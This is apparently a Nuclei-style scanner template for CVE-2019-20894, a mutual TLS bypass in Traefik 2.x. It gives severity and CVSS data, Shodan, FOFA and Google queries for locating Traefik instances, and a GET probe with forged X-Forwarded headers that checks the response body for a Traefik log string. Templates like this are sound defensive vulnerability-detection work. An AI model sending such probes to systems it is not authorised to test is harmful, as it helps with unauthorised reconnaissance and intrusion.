id: CVE-2019-20894

info:
  name: Traefik 2.x Mutual TLS Bypass
  author: ProjectDiscoveryAI
  severity: high
  description: Traefik 2.x, in certain configurations, allows HTTPS sessions to proceed without mutual TLS verification in a situation where ERR_BAD_SSL_CLIENT_AUTH_CERT should have occurred.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Apply the necessary patches provided by Traefik to fix the mutual TLS bypass vulnerability (CVE-2019-20894).
  reference:
    - https://github.com/containous/traefik/issues/5312
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-20894
    cwe-id: CWE-295
    epss-score: 0.00414
    epss-percentile: 0.74778
    cpe: cpe:2.3:a:traefik:traefik:*:*:*:*:*:*:*:*
  metadata:
    vendor: traefik
    product: traefik
    shodan-query: http.title:"traefik"
    fofa-query: title="traefik"
    google-query: intitle:"traefik"

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      X-Forwarded-Host: "without-mtls.example.com"
      X-Forwarded-Port: "443"
      X-Forwarded-Proto: "https"
      X-Forwarded-Server: "traefik-d9d59cbbc-wlltk"
      X-Real-Ip: "159.ip.striped.130"
    matchers:
      - type: word
        words:
          - "vulcand/oxy/roundrobin/rr: completed ServeHttp on request"
        part: body
